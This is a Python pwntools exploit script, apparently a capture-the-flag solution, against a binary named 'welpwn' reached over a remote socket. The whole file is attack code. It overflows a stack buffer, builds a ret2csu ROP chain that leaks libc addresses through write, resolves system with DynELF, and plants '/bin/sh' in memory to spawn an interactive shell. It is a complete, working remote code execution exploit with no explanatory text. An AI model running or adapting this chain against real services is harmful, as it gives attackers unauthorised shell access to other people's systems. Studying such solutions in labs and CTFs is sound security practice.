from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux')
#context.log_level = 'debug'
#io = process('./welpwn')
io = remote('192.168.95.146',10000)
elf = ELF('./welpwn')
length = 16
write_plt = elf.plt['write']
write_got = elf.got['write']
read_got = elf.got['read']
pop_rbx_rbp_r12_r13_r14_r15 = 0x40089A
pop4 = 0x40089C
mov_dx_si_di = 0x400880
pop_rdi = 0x4008a3
readn = 0x400805
main = 0x4007CD
bin_sh = 0x601100

io.recv()
def leak(address):
    payload = 'a'*length+'a'*8+p64(pop4)+p64(pop_rbx_rbp_r12_r13_r14_r15)
    payload +=p64(0)+p64(1)+p64(write_got)
    payload += p64(8)+p64(address)+p64(1)+p64(mov_dx_si_di)
    payload += p64(0)*7+p64(main)
    payload = payload.ljust(0x400,'C')
    io.send(payload)
    data = io.recv(8)
    io.recv()
    log.info("%#x => %s" %(address,hex(u64((data or '').ljust(8,'\x00')))))
    return data

def write(address,string):
    payload = 'a'*length+'a'*8+p64(pop4)+p64(pop_rbx_rbp_r12_r13_r14_r15)
    payload +=p64(0)+p64(1)+p64(read_got)
    payload += p64(len(string))+p64(address)+p64(0)+p64(mov_dx_si_di)
    payload += p64(0)*7+p64(main)
    payload = payload.ljust(0x400,'C')
    io.send(payload)
    io.send(string)
    
def getshell(address,bin_sh):
    payload = 'a'*length+'a'*8+p64(pop4)+p64(pop_rbx_rbp_r12_r13_r14_r15)
    payload +=p64(0)+p64(1)+p64(address)
    payload += p64(0)+p64(0)+p64(bin_sh)+p64(mov_dx_si_di)
    payload += p64(0)*7+p64(main)
    payload = payload.ljust(0x400,'C')
    io.send(payload)

#gdb.attach(io,'b *0x400814')
#raw_input()
d = DynELF(leak,elf=elf)
sys_addr = d.lookup('system','libc')
log.success("system address: "+hex(sys_addr))
#gdb.attach(io,'b *0x400793')
#raw_input()
write(bin_sh,'/bin/sh\x00'+p64(sys_addr))
getshell(bin_sh+8,bin_sh)
io.interactive()
